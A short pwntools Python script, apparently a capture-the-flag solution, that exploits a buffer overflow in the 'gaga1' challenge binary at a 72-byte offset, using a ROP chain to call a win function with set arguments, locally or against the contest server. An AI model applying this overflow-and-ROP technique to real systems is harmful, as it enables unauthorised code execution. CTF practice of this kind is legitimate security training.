#!/usr/bin/env python3

from pwn import *

elf = ELF("gaga1")

context.update(binary=elf, encoding='latin-1')

OFFSET = 72

def start():
    if args.GDB:
        return gdb.debug(elf.path)
    elif args.REMOTE:
        return remote("challs.actf.co", 31301)
    else:
        return process([elf.path])


def main():
    io = start()
    rop = ROP(elf)
    rop.win1(4919, 16705)
    io.clean()
    io.fit({OFFSET: rop.chain()})

    io.interactive()


if __name__ == "__main__":
    main()
